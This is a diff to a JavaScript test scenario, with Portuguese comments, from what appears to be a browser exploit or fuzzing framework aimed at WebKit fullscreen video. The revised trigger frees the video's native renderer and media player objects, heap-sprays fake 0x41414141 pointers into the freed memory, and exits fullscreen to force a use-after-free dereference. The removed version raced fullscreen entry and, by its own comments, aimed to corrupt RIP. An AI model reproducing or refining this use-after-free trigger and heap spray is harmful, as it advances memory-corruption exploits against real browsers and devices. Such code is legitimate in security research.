@@ -1,15 +1,16 @@
+
 /**
- * CENÁRIO: VIDEO_FULLSCREEN_ENTRANCE_CRASH
- * Alvo: Race Condition durante a alocação de memória do Manx na ENTRADA do Fullscreen
+ * CENÁRIO: VIDEO_FULLSCREEN_RENDERER_UAF
+ * Alvo: FullscreenVideoController Null/Stale Pointer Dereference
  */
 
 export default {
-    id:       'VIDEO_FULLSCREEN_ENTRANCE_CRASH',
+    id:       'VIDEO_FULLSCREEN_RENDERER_UAF',
     category: 'Media',
     risk:     'CRITICAL',
-    description: 'Foco exclusivo no CRASH: Corre contra a entrada do Fullscreen. ' +
-                 'Remove o vídeo exatamente durante a transição de entrada nativa do Manx ' +
-                 'e faz o spray massivo para corromper o RIP.',
+    description: 'Bypassa o OS Deadlock mantendo o vídeo no DOM, mas destrói ' +
+                 'as estruturas C++ nativas (RenderObject e MediaPlayerPrivate) ' +
+                 'usando CSS display:none e src nullification antes de sair do Fullscreen.',
 
     setup: async function() {
         this.container = document.createElement('div');
@@ -20,7 +21,7 @@ export default {
         this.video.controls = true;
         this.container.appendChild(this.video);
 
-        // A munição: 0x41414141 (AAAA) - O gatilho perfeito para o Crash
+        // A munição: 0x41414141 (Ponteiro falso)
         this.sprayPayload = new Uint32Array(256);
         this.sprayPayload.fill(0x41414141);
 
@@ -35,45 +36,51 @@ export default {
 
     trigger: async function() {
         try {
-            // 1. INICIA A ENTRADA NO FULLSCREEN NATIVO
+            // 1. ENTRADA NATIVA NO FULLSCREEN
             if (this.video.webkitEnterFullscreen) {
                 this.video.webkitEnterFullscreen();
             } else if (this.video.webkitRequestFullscreen) {
                 this.video.webkitRequestFullscreen();
             }
 
-            // 2. A JANELA CRÍTICA (RACE CONDITION)
-            // Em vez de esperar 400ms, esperamos apenas 15ms! 
-            // Queremos apanhar o C++ a MEIO da alocação do ecrã inteiro.
-            await new Promise(r => setTimeout(r, 15)); 
+            await new Promise(r => setTimeout(r, 300)); 
 
-            // 3. FREE: Puxamos o tapete enquanto o C++ ainda está a trabalhar!
-            this.video.remove();
+            // 2. O NOVO TEARDOWN (Destruição Fantasma)
+            // A. Destrói o RenderObject C++ (A caixa de layout)
+            this.video.style.display = 'none';
+            
+            // B. Destrói o MediaPlayerPrivate C++ (O descodificador nativo)
+            this.video.removeAttribute('src');
+            this.video.load();
 
-            // 4. SPRAY AGRESSIVO: Enchemos o buraco imediatamente.
-            // Quando a função de entrada do Fullscreen tentar ler a memória para 
-            // concluir o trabalho, vai ler 0x41414141 e Crashar.
+            // 3. SPRAY: Enchemos a memória imediatamente
             this.spray = [];
-            for (let i = 0; i < 8000; i++) { // Spray aumentado para 8000
+            for (let i = 0; i < 5000; i++) {
                 let arr = new Uint32Array(256);
                 arr.set(this.sprayPayload);
                 this.spray.push(arr);
             }
 
-            // ATENÇÃO: Retiramos propositadamente o webkitExitFullscreen. 
-            // Queremos que a consola bata de frente com a corrupção.
+            // 4. SAÍDA FATAL
+            // O controlador vai tentar acessar video->renderer() que agora é nulo/freed,
+            // ou video->player() que aponta para o nosso spray 0x41414141.
+            if (this.video.webkitExitFullscreen) {
+                this.video.webkitExitFullscreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            }
 
         } catch(e) {}
     },
 
     probe: [
-        // Mantemos probes mínimas. Se o crash não ocorrer instantaneamente, 
-        // isto tenta aceder ao lixo que deixámos para forçar o erro.
-        s => s.video.videoWidth,
-        s => s.video.webkitDecodedFrameCount
+        s => s.video.readyState,
+        s => s.video.webkitDecodedFrameCount,
+        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
     ],
 
     cleanup: function() {
+        // Agora sim, limpamos o DOM de forma segura no final do ciclo
         try { this.container.remove(); } catch(e) {}
         this.spray = null;
     }
